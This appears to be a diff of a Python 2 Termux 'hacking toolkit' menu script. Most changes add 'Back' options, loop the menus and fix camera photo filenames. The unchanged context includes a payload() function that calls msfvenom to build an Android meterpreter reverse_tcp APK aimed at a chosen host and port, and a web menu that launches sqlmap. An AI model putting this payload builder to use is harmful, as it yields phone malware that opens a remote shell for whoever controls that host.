@@ -126,23 +126,31 @@ def payload():
   l2 = raw_input("port > ")
   os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ l1 +" LPORT="+ l2 +" R > /sdcard/payload.apk")
   print(colored("""payload save in sdcard payload.apk""", "green"))
-
+  time.sleep(5)
+  BasicC()
+  
 def flash():
  print(colored("""
 	===============
 	1. On
 	2. Off
 	===============
+	B. Back
+	===============
  ""","green"))
  torch = raw_input("stark >")
  if torch == "1":
   os.system("termux-torch on")
+  flash()
  elif torch == "2":
   os.system("termux-torch off")
+  flash()
+ elif torch == "b" or torch == "B":
+	 BasicC()
 
 def battery():
  os.system("termux-battery-status")
- time.sleep(3)
+ time.sleep(5)
 
 
 def cphoto():
@@ -151,15 +159,26 @@ def cphoto():
   1.Back
   2.Front
   ####################
+  B. Back
+  ####################
   """, "green"))
  cp = raw_input("photo > ")
  if cp == "1":
-  os.system("termux-camera-photo -c 0 /sdcard/back")
+  os.system("termux-camera-photo -c 0 /sdcard/back.jpg")
   print(colored("""image has been saved in /sdcard/back.jpg""", "green"))
+  time.sleep(3)
+  os.system("clear")
+  cphoto()
+	 
  elif cp == "2":
-  os.system("termux-camera-photo -c 1 /sdcard/front")
+  os.system("termux-camera-photo -c 1 /sdcard/front.jpg")
   print(colored("""image has been saved in /sdcard/front.jpg""", "green"))
-
+  time.sleep(3)
+  os.system("clear")
+  cphoto()
+ elif cp == "B" or cp == "b":
+	 BasicC()
+	 
 def textspeach():
  print(colored("""Enter here your words sir""", "green"))
  txtsp = raw_input("text > ")
@@ -262,6 +281,7 @@ def WebH():
   os.system("echo Terminal Clean in 9min | lolcat -a -d 9000")
  elif web == "3":
   webadm()
+  time.sleep(6)
  elif web == "4":
   sqlmap()
  elif web == "5":
